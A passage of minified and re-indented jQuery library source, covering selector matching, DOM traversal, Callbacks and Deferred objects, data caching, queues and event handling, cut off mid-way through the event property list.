        (r = D(e, Ce(o, i))).selector = e;
      }
      return r;
    }, g = re.select = function (e, t, n, i) {
      var o,
        r,
        a,
        s,
        l,
        d = "function" == typeof e && e,
        c = !i && f(e = d.selector || e);
      if (n = n || [], 1 === c.length) {
        if (2 < (r = c[0] = c[0].slice(0)).length && "ID" === (a = r[0]).type && 9 === t.nodeType && k && w.relative[r[1].type]) {
          if (!(t = (w.find.ID(a.matches[0].replace(te, u), t) || [])[0])) return n;
          d && (t = t.parentNode), e = e.slice(r.shift().value.length);
        }
        for (o = K.needsContext.test(e) ? 0 : r.length; o-- && (a = r[o], !w.relative[s = a.type]);) if ((l = w.find[s]) && (i = l(a.matches[0].replace(te, u), ee.test(r[0].type) && ge(t.parentNode) || t))) {
          if (r.splice(o, 1), !(e = i.length && ve(r))) return H.apply(n, i), n;
          break;
        }
      }
      return (d || p(e, c))(i, t, !k, n, !t || ee.test(e) && ge(t.parentNode) || t), n;
    }, h.sortStable = S.split("").sort(_).join("") === S, h.detectDuplicates = !!d, j(), h.sortDetached = le(function (e) {
      return 1 & e.compareDocumentPosition(C.createElement("fieldset"));
    }), le(function (e) {
      return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href");
    }) || de("type|href|height|width", function (e, t, n) {
      if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2);
    }), h.attributes && le(function (e) {
      return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value");
    }) || de("value", function (e, t, n) {
      if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue;
    }), le(function (e) {
      return null == e.getAttribute("disabled");
    }) || de(N, function (e, t, n) {
      var i;
      if (!n) return !0 === e[t] ? t.toLowerCase() : (i = e.getAttributeNode(t)) && i.specified ? i.value : null;
    }), re;
  }(C);
  S.find = h, S.expr = h.selectors, S.expr[":"] = S.expr.pseudos, S.uniqueSort = S.unique = h.uniqueSort, S.text = h.getText, S.isXMLDoc = h.isXML, S.contains = h.contains, S.escapeSelector = h.escape;
  function f(e, t, n) {
    for (var i = [], o = void 0 !== n; (e = e[t]) && 9 !== e.nodeType;) if (1 === e.nodeType) {
      if (o && S(e).is(n)) break;
      i.push(e);
    }
    return i;
  }
  function j(e, t) {
    for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
    return n;
  }
  var $ = S.expr.match.needsContext;
  function T(e, t) {
    return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase();
  }
  var E = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;
  function D(e, n, i) {
    return b(n) ? S.grep(e, function (e, t) {
      return !!n.call(e, t, e) !== i;
    }) : n.nodeType ? S.grep(e, function (e) {
      return e === n !== i;
    }) : "string" != typeof n ? S.grep(e, function (e) {
      return -1 < o.call(n, e) !== i;
    }) : S.filter(n, e, i);
  }
  S.filter = function (e, t, n) {
    var i = t[0];
    return n && (e = ":not(" + e + ")"), 1 === t.length && 1 === i.nodeType ? S.find.matchesSelector(i, e) ? [i] : [] : S.find.matches(e, S.grep(t, function (e) {
      return 1 === e.nodeType;
    }));
  }, S.fn.extend({
    find: function (e) {
      var t,
        n,
        i = this.length,
        o = this;
      if ("string" != typeof e) return this.pushStack(S(e).filter(function () {
        for (t = 0; t < i; t++) if (S.contains(o[t], this)) return !0;
      }));
      for (n = this.pushStack([]), t = 0; t < i; t++) S.find(e, o[t], n);
      return 1 < i ? S.uniqueSort(n) : n;
    },
    filter: function (e) {
      return this.pushStack(D(this, e || [], !1));
    },
    not: function (e) {
      return this.pushStack(D(this, e || [], !0));
    },
    is: function (e) {
      return !!D(this, "string" == typeof e && $.test(e) ? S(e) : e || [], !1).length;
    }
  });
  var _,
    A = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
  (S.fn.init = function (e, t, n) {
    var i, o;
    if (!e) return this;
    if (n = n || _, "string" != typeof e) return e.nodeType ? (this[0] = e, this.length = 1, this) : b(e) ? void 0 !== n.ready ? n.ready(e) : e(S) : S.makeArray(e, this);
    if (!(i = "<" === e[0] && ">" === e[e.length - 1] && 3 <= e.length ? [null, e, null] : A.exec(e)) || !i[1] && t) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e);
    if (i[1]) {
      if (t = t instanceof S ? t[0] : t, S.merge(this, S.parseHTML(i[1], t && t.nodeType ? t.ownerDocument || t : k, !0)), E.test(i[1]) && S.isPlainObject(t)) for (i in t) b(this[i]) ? this[i](t[i]) : this.attr(i, t[i]);
      return this;
    }
    return (o = k.getElementById(i[2])) && (this[0] = o, this.length = 1), this;
  }).prototype = S.fn, _ = S(k);
  var I = /^(?:parents|prev(?:Until|All))/,
    P = {
      children: !0,
      contents: !0,
      next: !0,
      prev: !0
    };
  function H(e, t) {
    for (; (e = e[t]) && 1 !== e.nodeType;);
    return e;
  }
  S.fn.extend({
    has: function (e) {
      var t = S(e, this),
        n = t.length;
      return this.filter(function () {
        for (var e = 0; e < n; e++) if (S.contains(this, t[e])) return !0;
      });
    },
    closest: function (e, t) {
      var n,
        i = 0,
        o = this.length,
        r = [],
        a = "string" != typeof e && S(e);
      if (!$.test(e)) for (; i < o; i++) for (n = this[i]; n && n !== t; n = n.parentNode) if (n.nodeType < 11 && (a ? -1 < a.index(n) : 1 === n.nodeType && S.find.matchesSelector(n, e))) {
        r.push(n);
        break;
      }
      return this.pushStack(1 < r.length ? S.uniqueSort(r) : r);
    },
    index: function (e) {
      return e ? "string" == typeof e ? o.call(S(e), this[0]) : o.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1;
    },
    add: function (e, t) {
      return this.pushStack(S.uniqueSort(S.merge(this.get(), S(e, t))));
    },
    addBack: function (e) {
      return this.add(null == e ? this.prevObject : this.prevObject.filter(e));
    }
  }), S.each({
    parent: function (e) {
      var t = e.parentNode;
      return t && 11 !== t.nodeType ? t : null;
    },
    parents: function (e) {
      return f(e, "parentNode");
    },
    parentsUntil: function (e, t, n) {
      return f(e, "parentNode", n);
    },
    next: function (e) {
      return H(e, "nextSibling");
    },
    prev: function (e) {
      return H(e, "previousSibling");
    },
    nextAll: function (e) {
      return f(e, "nextSibling");
    },
    prevAll: function (e) {
      return f(e, "previousSibling");
    },
    nextUntil: function (e, t, n) {
      return f(e, "nextSibling", n);
    },
    prevUntil: function (e, t, n) {
      return f(e, "previousSibling", n);
    },
    siblings: function (e) {
      return j((e.parentNode || {}).firstChild, e);
    },
    children: function (e) {
      return j(e.firstChild);
    },
    contents: function (e) {
      return T(e, "iframe") ? e.contentDocument : (T(e, "template") && (e = e.content || e), S.merge([], e.childNodes));
    }
  }, function (i, o) {
    S.fn[i] = function (e, t) {
      var n = S.map(this, o, e);
      return "Until" !== i.slice(-5) && (t = e), t && "string" == typeof t && (n = S.filter(t, n)), 1 < this.length && (P[i] || S.uniqueSort(n), I.test(i) && n.reverse()), this.pushStack(n);
    };
  });
  var M = /[^\x20\t\r\n\f]+/g;
  function L(e) {
    return e;
  }
  function N(e) {
    throw e;
  }
  function O(e, t, n, i) {
    var o;
    try {
      e && b(o = e.promise) ? o.call(e).done(t).fail(n) : e && b(o = e.then) ? o.call(e, t, n) : t.apply(void 0, [e].slice(i));
    } catch (e) {
      n.apply(void 0, [e]);
    }
  }
  S.Callbacks = function (i) {
    var e, n;
    i = "string" == typeof i ? (e = i, n = {}, S.each(e.match(M) || [], function (e, t) {
      n[t] = !0;
    }), n) : S.extend({}, i);
    function o() {
      for (s = s || i.once, a = r = !0; d.length; c = -1) for (t = d.shift(); ++c < l.length;) !1 === l[c].apply(t[0], t[1]) && i.stopOnFalse && (c = l.length, t = !1);
      i.memory || (t = !1), r = !1, s && (l = t ? [] : "");
    }
    var r,
      t,
      a,
      s,
      l = [],
      d = [],
      c = -1,
      u = {
        add: function () {
          return l && (t && !r && (c = l.length - 1, d.push(t)), function n(e) {
            S.each(e, function (e, t) {
              b(t) ? i.unique && u.has(t) || l.push(t) : t && t.length && "string" !== x(t) && n(t);
            });
          }(arguments), t && !r && o()), this;
        },
        remove: function () {
          return S.each(arguments, function (e, t) {
            for (var n; -1 < (n = S.inArray(t, l, n));) l.splice(n, 1), n <= c && c--;
          }), this;
        },
        has: function (e) {
          return e ? -1 < S.inArray(e, l) : 0 < l.length;
        },
        empty: function () {
          return l = l && [], this;
        },
        disable: function () {
          return s = d = [], l = t = "", this;
        },
        disabled: function () {
          return !l;
        },
        lock: function () {
          return s = d = [], t || r || (l = t = ""), this;
        },
        locked: function () {
          return !!s;
        },
        fireWith: function (e, t) {
          return s || (t = [e, (t = t || []).slice ? t.slice() : t], d.push(t), r || o()), this;
        },
        fire: function () {
          return u.fireWith(this, arguments), this;
        },
        fired: function () {
          return !!a;
        }
      };
    return u;
  }, S.extend({
    Deferred: function (e) {
      var r = [["notify", "progress", S.Callbacks("memory"), S.Callbacks("memory"), 2], ["resolve", "done", S.Callbacks("once memory"), S.Callbacks("once memory"), 0, "resolved"], ["reject", "fail", S.Callbacks("once memory"), S.Callbacks("once memory"), 1, "rejected"]],
        o = "pending",
        a = {
          state: function () {
            return o;
          },
          always: function () {
            return s.done(arguments).fail(arguments), this;
          },
          catch: function (e) {
            return a.then(null, e);
          },
          pipe: function () {
            var o = arguments;
            return S.Deferred(function (i) {
              S.each(r, function (e, t) {
                var n = b(o[t[4]]) && o[t[4]];
                s[t[1]](function () {
                  var e = n && n.apply(this, arguments);
                  e && b(e.promise) ? e.promise().progress(i.notify).done(i.resolve).fail(i.reject) : i[t[0] + "With"](this, n ? [e] : arguments);
                });
              }), o = null;
            }).promise();
          },
          then: function (t, n, i) {
            var l = 0;
            function d(o, r, a, s) {
              return function () {
                function e() {
                  var e, t;
                  if (!(o < l)) {
                    if ((e = a.apply(n, i)) === r.promise()) throw new TypeError("Thenable self-resolution");
                    t = e && ("object" == typeof e || "function" == typeof e) && e.then, b(t) ? s ? t.call(e, d(l, r, L, s), d(l, r, N, s)) : (l++, t.call(e, d(l, r, L, s), d(l, r, N, s), d(l, r, L, r.notifyWith))) : (a !== L && (n = void 0, i = [e]), (s || r.resolveWith)(n, i));
                  }
                }
                var n = this,
                  i = arguments,
                  t = s ? e : function () {
                    try {
                      e();
                    } catch (e) {
                      S.Deferred.exceptionHook && S.Deferred.exceptionHook(e, t.stackTrace), l <= o + 1 && (a !== N && (n = void 0, i = [e]), r.rejectWith(n, i));
                    }
                  };
                o ? t() : (S.Deferred.getStackHook && (t.stackTrace = S.Deferred.getStackHook()), C.setTimeout(t));
              };
            }
            return S.Deferred(function (e) {
              r[0][3].add(d(0, e, b(i) ? i : L, e.notifyWith)), r[1][3].add(d(0, e, b(t) ? t : L)), r[2][3].add(d(0, e, b(n) ? n : N));
            }).promise();
          },
          promise: function (e) {
            return null != e ? S.extend(e, a) : a;
          }
        },
        s = {};
      return S.each(r, function (e, t) {
        var n = t[2],
          i = t[5];
        a[t[1]] = n.add, i && n.add(function () {
          o = i;
        }, r[3 - e][2].disable, r[3 - e][3].disable, r[0][2].lock, r[0][3].lock), n.add(t[3].fire), s[t[0]] = function () {
          return s[t[0] + "With"](this === s ? void 0 : this, arguments), this;
        }, s[t[0] + "With"] = n.fireWith;
      }), a.promise(s), e && e.call(s, s), s;
    },
    when: function (e) {
      function t(t) {
        return function (e) {
          o[t] = this, r[t] = 1 < arguments.length ? s.call(arguments) : e, --n || a.resolveWith(o, r);
        };
      }
      var n = arguments.length,
        i = n,
        o = Array(i),
        r = s.call(arguments),
        a = S.Deferred();
      if (n <= 1 && (O(e, a.done(t(i)).resolve, a.reject, !n), "pending" === a.state() || b(r[i] && r[i].then))) return a.then();
      for (; i--;) O(r[i], t(i), a.reject);
      return a.promise();
    }
  });
  var R = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
  S.Deferred.exceptionHook = function (e, t) {
    C.console && C.console.warn && e && R.test(e.name) && C.console.warn("jQuery.Deferred exception: " + e.message, e.stack, t);
  }, S.readyException = function (e) {
    C.setTimeout(function () {
      throw e;
    });
  };
  var F = S.Deferred();
  function B() {
    k.removeEventListener("DOMContentLoaded", B), C.removeEventListener("load", B), S.ready();
  }
  S.fn.ready = function (e) {
    return F.then(e).catch(function (e) {
      S.readyException(e);
    }), this;
  }, S.extend({
    isReady: !1,
    readyWait: 1,
    ready: function (e) {
      (!0 === e ? --S.readyWait : S.isReady) || (S.isReady = !0) !== e && 0 < --S.readyWait || F.resolveWith(k, [S]);
    }
  }), S.ready.then = F.then, "complete" === k.readyState || "loading" !== k.readyState && !k.documentElement.doScroll ? C.setTimeout(S.ready) : (k.addEventListener("DOMContentLoaded", B), C.addEventListener("load", B));
  var z = function (e, t, n, i, o, r, a) {
      var s = 0,
        l = e.length,
        d = null == n;
      if ("object" === x(n)) for (s in o = !0, n) z(e, t, s, n[s], !0, r, a);else if (void 0 !== i && (o = !0, b(i) || (a = !0), d && (t = a ? (t.call(e, i), null) : (d = t, function (e, t, n) {
        return d.call(S(e), n);
      })), t)) for (; s < l; s++) t(e[s], n, a ? i : i.call(e[s], s, t(e[s], n)));
      return o ? e : d ? t.call(e) : l ? t(e[0], n) : r;
    },
    q = /^-ms-/,
    W = /-([a-z])/g;
  function U(e, t) {
    return t.toUpperCase();
  }
  function Y(e) {
    return e.replace(q, "ms-").replace(W, U);
  }
  function X(e) {
    return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType;
  }
  function V() {
    this.expando = S.expando + V.uid++;
  }
  V.uid = 1, V.prototype = {
    cache: function (e) {
      var t = e[this.expando];
      return t || (t = {}, X(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, {
        value: t,
        configurable: !0
      }))), t;
    },
    set: function (e, t, n) {
      var i,
        o = this.cache(e);
      if ("string" == typeof t) o[Y(t)] = n;else for (i in t) o[Y(i)] = t[i];
      return o;
    },
    get: function (e, t) {
      return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][Y(t)];
    },
    access: function (e, t, n) {
      return void 0 === t || t && "string" == typeof t && void 0 === n ? this.get(e, t) : (this.set(e, t, n), void 0 !== n ? n : t);
    },
    remove: function (e, t) {
      var n,
        i = e[this.expando];
      if (void 0 !== i) {
        if (void 0 !== t) {
          n = (t = Array.isArray(t) ? t.map(Y) : (t = Y(t)) in i ? [t] : t.match(M) || []).length;
          for (; n--;) delete i[t[n]];
        }
        void 0 !== t && !S.isEmptyObject(i) || (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando]);
      }
    },
    hasData: function (e) {
      var t = e[this.expando];
      return void 0 !== t && !S.isEmptyObject(t);
    }
  };
  var K = new V(),
    Q = new V(),
    G = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
    J = /[A-Z]/g;
  function Z(e, t, n) {
    var i, o;
    if (void 0 === n && 1 === e.nodeType) if (i = "data-" + t.replace(J, "-$&").toLowerCase(), "string" == typeof (n = e.getAttribute(i))) {
      try {
        n = "true" === (o = n) || "false" !== o && ("null" === o ? null : o === +o + "" ? +o : G.test(o) ? JSON.parse(o) : o);
      } catch (e) {}
      Q.set(e, t, n);
    } else n = void 0;
    return n;
  }
  S.extend({
    hasData: function (e) {
      return Q.hasData(e) || K.hasData(e);
    },
    data: function (e, t, n) {
      return Q.access(e, t, n);
    },
    removeData: function (e, t) {
      Q.remove(e, t);
    },
    _data: function (e, t, n) {
      return K.access(e, t, n);
    },
    _removeData: function (e, t) {
      K.remove(e, t);
    }
  }), S.fn.extend({
    data: function (n, e) {
      var t,
        i,
        o,
        r = this[0],
        a = r && r.attributes;
      if (void 0 !== n) return "object" == typeof n ? this.each(function () {
        Q.set(this, n);
      }) : z(this, function (e) {
        var t;
        if (r && void 0 === e) {
          if (void 0 !== (t = Q.get(r, n))) return t;
          if (void 0 !== (t = Z(r, n))) return t;
        } else this.each(function () {
          Q.set(this, n, e);
        });
      }, null, e, 1 < arguments.length, null, !0);
      if (this.length && (o = Q.get(r), 1 === r.nodeType && !K.get(r, "hasDataAttrs"))) {
        for (t = a.length; t--;) a[t] && 0 === (i = a[t].name).indexOf("data-") && (i = Y(i.slice(5)), Z(r, i, o[i]));
        K.set(r, "hasDataAttrs", !0);
      }
      return o;
    },
    removeData: function (e) {
      return this.each(function () {
        Q.remove(this, e);
      });
    }
  }), S.extend({
    queue: function (e, t, n) {
      var i;
      if (e) return t = (t || "fx") + "queue", i = K.get(e, t), n && (!i || Array.isArray(n) ? i = K.access(e, t, S.makeArray(n)) : i.push(n)), i || [];
    },
    dequeue: function (e, t) {
      t = t || "fx";
      var n = S.queue(e, t),
        i = n.length,
        o = n.shift(),
        r = S._queueHooks(e, t);
      "inprogress" === o && (o = n.shift(), i--), o && ("fx" === t && n.unshift("inprogress"), delete r.stop, o.call(e, function () {
        S.dequeue(e, t);
      }, r)), !i && r && r.empty.fire();
    },
    _queueHooks: function (e, t) {
      var n = t + "queueHooks";
      return K.get(e, n) || K.access(e, n, {
        empty: S.Callbacks("once memory").add(function () {
          K.remove(e, [t + "queue", n]);
        })
      });
    }
  }), S.fn.extend({
    queue: function (t, n) {
      var e = 2;
      return "string" != typeof t && (n = t, t = "fx", e--), arguments.length < e ? S.queue(this[0], t) : void 0 === n ? this : this.each(function () {
        var e = S.queue(this, t, n);
        S._queueHooks(this, t), "fx" === t && "inprogress" !== e[0] && S.dequeue(this, t);
      });
    },
    dequeue: function (e) {
      return this.each(function () {
        S.dequeue(this, e);
      });
    },
    clearQueue: function (e) {
      return this.queue(e || "fx", []);
    },
    promise: function (e, t) {
      function n() {
        --o || r.resolveWith(a, [a]);
      }
      var i,
        o = 1,
        r = S.Deferred(),
        a = this,
        s = this.length;
      for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; s--;) (i = K.get(a[s], e + "queueHooks")) && i.empty && (o++, i.empty.add(n));
      return n(), r.promise(t);
    }
  });
  function ee(e, t, n, i) {
    var o,
      r,
      a = {};
    for (r in t) a[r] = e.style[r], e.style[r] = t[r];
    for (r in o = n.apply(e, i || []), t) e.style[r] = a[r];
    return o;
  }
  var te = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
    ne = new RegExp("^(?:([+-])=|)(" + te + ")([a-z%]*)$", "i"),
    ie = ["Top", "Right", "Bottom", "Left"],
    oe = function (e, t) {
      return "none" === (e = t || e).style.display || "" === e.style.display && S.contains(e.ownerDocument, e) && "none" === S.css(e, "display");
    };
  function re(e, t, n, i) {
    var o,
      r,
      a = 20,
      s = i ? function () {
        return i.cur();
      } : function () {
        return S.css(e, t, "");
      },
      l = s(),
      d = n && n[3] || (S.cssNumber[t] ? "" : "px"),
      c = (S.cssNumber[t] || "px" !== d && +l) && ne.exec(S.css(e, t));
    if (c && c[3] !== d) {
      for (l /= 2, d = d || c[3], c = +l || 1; a--;) S.style(e, t, c + d), (1 - r) * (1 - (r = s() / l || .5)) <= 0 && (a = 0), c /= r;
      c *= 2, S.style(e, t, c + d), n = n || [];
    }
    return n && (c = +c || +l || 0, o = n[1] ? c + (n[1] + 1) * n[2] : +n[2], i && (i.unit = d, i.start = c, i.end = o)), o;
  }
  var ae = {};
  function se(e, t) {
    for (var n, i, o = [], r = 0, a = e.length; r < a; r++) (i = e[r]).style && (n = i.style.display, t ? ("none" === n && (o[r] = K.get(i, "display") || null, o[r] || (i.style.display = "")), "" === i.style.display && oe(i) && (o[r] = (u = d = l = void 0, d = (s = i).ownerDocument, c = s.nodeName, (u = ae[c]) || (l = d.body.appendChild(d.createElement(c)), u = S.css(l, "display"), l.parentNode.removeChild(l), "none" === u && (u = "block"), ae[c] = u)))) : "none" !== n && (o[r] = "none", K.set(i, "display", n)));
    var s, l, d, c, u;
    for (r = 0; r < a; r++) null != o[r] && (e[r].style.display = o[r]);
    return e;
  }
  S.fn.extend({
    show: function () {
      return se(this, !0);
    },
    hide: function () {
      return se(this);
    },
    toggle: function (e) {
      return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each(function () {
        oe(this) ? S(this).show() : S(this).hide();
      });
    }
  });
  var le = /^(?:checkbox|radio)$/i,
    de = /<([a-z][^\/\0>\x20\t\r\n\f]+)/i,
    ce = /^$|^module$|\/(?:java|ecma)script/i,
    ue = {
      option: [1, "<select multiple='multiple'>", "</select>"],
      thead: [1, "<table>", "</table>"],
      col: [2, "<table><colgroup>", "</colgroup></table>"],
      tr: [2, "<table><tbody>", "</tbody></table>"],
      td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
      _default: [0, "", ""]
    };
  function pe(e, t) {
    var n;
    return n = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : [], void 0 === t || t && T(e, t) ? S.merge([e], n) : n;
  }
  function he(e, t) {
    for (var n = 0, i = e.length; n < i; n++) K.set(e[n], "globalEval", !t || K.get(t[n], "globalEval"));
  }
  ue.optgroup = ue.option, ue.tbody = ue.tfoot = ue.colgroup = ue.caption = ue.thead, ue.th = ue.td;
  var fe,
    ge,
    me = /<|&#?\w+;/;
  function ve(e, t, n, i, o) {
    for (var r, a, s, l, d, c, u = t.createDocumentFragment(), p = [], h = 0, f = e.length; h < f; h++) if ((r = e[h]) || 0 === r) if ("object" === x(r)) S.merge(p, r.nodeType ? [r] : r);else if (me.test(r)) {
      for (a = a || u.appendChild(t.createElement("div")), s = (de.exec(r) || ["", ""])[1].toLowerCase(), l = ue[s] || ue._default, a.innerHTML = l[1] + S.htmlPrefilter(r) + l[2], c = l[0]; c--;) a = a.lastChild;
      S.merge(p, a.childNodes), (a = u.firstChild).textContent = "";
    } else p.push(t.createTextNode(r));
    for (u.textContent = "", h = 0; r = p[h++];) if (i && -1 < S.inArray(r, i)) o && o.push(r);else if (d = S.contains(r.ownerDocument, r), a = pe(u.appendChild(r), "script"), d && he(a), n) for (c = 0; r = a[c++];) ce.test(r.type || "") && n.push(r);
    return u;
  }
  fe = k.createDocumentFragment().appendChild(k.createElement("div")), (ge = k.createElement("input")).setAttribute("type", "radio"), ge.setAttribute("checked", "checked"), ge.setAttribute("name", "t"), fe.appendChild(ge), y.checkClone = fe.cloneNode(!0).cloneNode(!0).lastChild.checked, fe.innerHTML = "<textarea>x</textarea>", y.noCloneChecked = !!fe.cloneNode(!0).lastChild.defaultValue;
  var ye = k.documentElement,
    be = /^key/,
    we = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
    xe = /^([^.]*)(?:\.(.+)|)/;
  function je() {
    return !0;
  }
  function Ce() {
    return !1;
  }
  function ke() {
    try {
      return k.activeElement;
    } catch (e) {}
  }
  function Se(e, t, n, i, o, r) {
    var a, s;
    if ("object" == typeof t) {
      for (s in "string" != typeof n && (i = i || n, n = void 0), t) Se(e, s, n, i, t[s], r);
      return e;
    }
    if (null == i && null == o ? (o = n, i = n = void 0) : null == o && ("string" == typeof n ? (o = i, i = void 0) : (o = i, i = n, n = void 0)), !1 === o) o = Ce;else if (!o) return e;
    return 1 === r && (a = o, (o = function (e) {
      return S().off(e), a.apply(this, arguments);
    }).guid = a.guid || (a.guid = S.guid++)), e.each(function () {
      S.event.add(this, t, o, i, n);
    });
  }
  S.event = {
    global: {},
    add: function (t, e, n, i, o) {
      var r,
        a,
        s,
        l,
        d,
        c,
        u,
        p,
        h,
        f,
        g,
        m = K.get(t);
      if (m) for (n.handler && (n = (r = n).handler, o = r.selector), o && S.find.matchesSelector(ye, o), n.guid || (n.guid = S.guid++), (l = m.events) || (l = m.events = {}), (a = m.handle) || (a = m.handle = function (e) {
        return void 0 !== S && S.event.triggered !== e.type ? S.event.dispatch.apply(t, arguments) : void 0;
      }), d = (e = (e || "").match(M) || [""]).length; d--;) h = g = (s = xe.exec(e[d]) || [])[1], f = (s[2] || "").split(".").sort(), h && (u = S.event.special[h] || {}, h = (o ? u.delegateType : u.bindType) || h, u = S.event.special[h] || {}, c = S.extend({
        type: h,
        origType: g,
        data: i,
        handler: n,
        guid: n.guid,
        selector: o,
        needsContext: o && S.expr.match.needsContext.test(o),
        namespace: f.join(".")
      }, r), (p = l[h]) || ((p = l[h] = []).delegateCount = 0, u.setup && !1 !== u.setup.call(t, i, f, a) || t.addEventListener && t.addEventListener(h, a)), u.add && (u.add.call(t, c), c.handler.guid || (c.handler.guid = n.guid)), o ? p.splice(p.delegateCount++, 0, c) : p.push(c), S.event.global[h] = !0);
    },
    remove: function (e, t, n, i, o) {
      var r,
        a,
        s,
        l,
        d,
        c,
        u,
        p,
        h,
        f,
        g,
        m = K.hasData(e) && K.get(e);
      if (m && (l = m.events)) {
        for (d = (t = (t || "").match(M) || [""]).length; d--;) if (h = g = (s = xe.exec(t[d]) || [])[1], f = (s[2] || "").split(".").sort(), h) {
          for (u = S.event.special[h] || {}, p = l[h = (i ? u.delegateType : u.bindType) || h] || [], s = s[2] && new RegExp("(^|\\.)" + f.join("\\.(?:.*\\.|)") + "(\\.|$)"), a = r = p.length; r--;) c = p[r], !o && g !== c.origType || n && n.guid !== c.guid || s && !s.test(c.namespace) || i && i !== c.selector && ("**" !== i || !c.selector) || (p.splice(r, 1), c.selector && p.delegateCount--, u.remove && u.remove.call(e, c));
          a && !p.length && (u.teardown && !1 !== u.teardown.call(e, f, m.handle) || S.removeEvent(e, h, m.handle), delete l[h]);
        } else for (h in l) S.event.remove(e, h + t[d], n, i, !0);
        S.isEmptyObject(l) && K.remove(e, "handle events");
      }
    },
    dispatch: function (e) {
      var t,
        n,
        i,
        o,
        r,
        a,
        s = S.event.fix(e),
        l = new Array(arguments.length),
        d = (K.get(this, "events") || {})[s.type] || [],
        c = S.event.special[s.type] || {};
      for (l[0] = s, t = 1; t < arguments.length; t++) l[t] = arguments[t];
      if (s.delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, s)) {
        for (a = S.event.handlers.call(this, s, d), t = 0; (o = a[t++]) && !s.isPropagationStopped();) for (s.currentTarget = o.elem, n = 0; (r = o.handlers[n++]) && !s.isImmediatePropagationStopped();) s.rnamespace && !s.rnamespace.test(r.namespace) || (s.handleObj = r, s.data = r.data, void 0 !== (i = ((S.event.special[r.origType] || {}).handle || r.handler).apply(o.elem, l)) && !1 === (s.result = i) && (s.preventDefault(), s.stopPropagation()));
        return c.postDispatch && c.postDispatch.call(this, s), s.result;
      }
    },
    handlers: function (e, t) {
      var n,
        i,
        o,
        r,
        a,
        s = [],
        l = t.delegateCount,
        d = e.target;
      if (l && d.nodeType && !("click" === e.type && 1 <= e.button)) for (; d !== this; d = d.parentNode || this) if (1 === d.nodeType && ("click" !== e.type || !0 !== d.disabled)) {
        for (r = [], a = {}, n = 0; n < l; n++) void 0 === a[o = (i = t[n]).selector + " "] && (a[o] = i.needsContext ? -1 < S(o, this).index(d) : S.find(o, this, null, [d]).length), a[o] && r.push(i);
        r.length && s.push({
          elem: d,
          handlers: r
        });
      }
      return d = this, l < t.length && s.push({
        elem: d,
        handlers: t.slice(l)
      }), s;
    },
    addProp: function (t, e) {
      Object.defineProperty(S.Event.prototype, t, {
        enumerable: !0,
        configurable: !0,
        get: b(e) ? function () {
          if (this.originalEvent) return e(this.originalEvent);
        } : function () {
          if (this.originalEvent) return this.originalEvent[t];
        },
        set: function (e) {
          Object.defineProperty(this, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: e
          });
        }
      });
    },
    fix: function (e) {
      return e[S.expando] ? e : new S.Event(e);
    },
    special: {
      load: {
        noBubble: !0
      },
      focus: {
        trigger: function () {
          if (this !== ke() && this.focus) return this.focus(), !1;
        },
        delegateType: "focusin"
      },
      blur: {
        trigger: function () {
          if (this === ke() && this.blur) return this.blur(), !1;
        },
        delegateType: "focusout"
      },
      click: {
        trigger: function () {
          if ("checkbox" === this.type && this.click && T(this, "input")) return this.click(), !1;
        },
        _default: function (e) {
          return T(e.target, "a");
        }
      },
      beforeunload: {
        postDispatch: function (e) {
          void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result);
        }
      }
    }
  }, S.removeEvent = function (e, t, n) {
    e.removeEventListener && e.removeEventListener(t, n);
  }, S.Event = function (e, t) {
    if (!(this instanceof S.Event)) return new S.Event(e, t);
    e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? je : Ce, this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target, this.currentTarget = e.currentTarget, this.relatedTarget = e.relatedTarget) : this.type = e, t && S.extend(this, t), this.timeStamp = e && e.timeStamp || Date.now(), this[S.expando] = !0;
  }, S.Event.prototype = {
    constructor: S.Event,
    isDefaultPrevented: Ce,
    isPropagationStopped: Ce,
    isImmediatePropagationStopped: Ce,
    isSimulated: !1,
    preventDefault: function () {
      var e = this.originalEvent;
      this.isDefaultPrevented = je, e && !this.isSimulated && e.preventDefault();
    },
    stopPropagation: function () {
      var e = this.originalEvent;
      this.isPropagationStopped = je, e && !this.isSimulated && e.stopPropagation();
    },
    stopImmediatePropagation: function () {
      var e = this.originalEvent;
      this.isImmediatePropagationStopped = je, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation();
    }
  }, S.each({
    altKey: !0,
    bubbles: !0,
    cancelable: !0,
    changedTouches: !0,
    ctrlKey: !0,
    detail: !0,
    eventPhase: !0,
    metaKey: !0,
    pageX: !0,
    pageY: !0,
    shiftKey: !0,
    view: !0,
    char: !0,
    charCode: !0,
    key: !0,
    keyCode: !0,
    button: !0,
    buttons: !0,
    clientX: !0,
    clientY: !0,
    offsetX: !0,
    offsetY: !0,
    pointerId: !0,
    pointerType: !0,
    screenX: !0,
    screenY: !0,
    targetTouches: !0,
    toElement: !0,
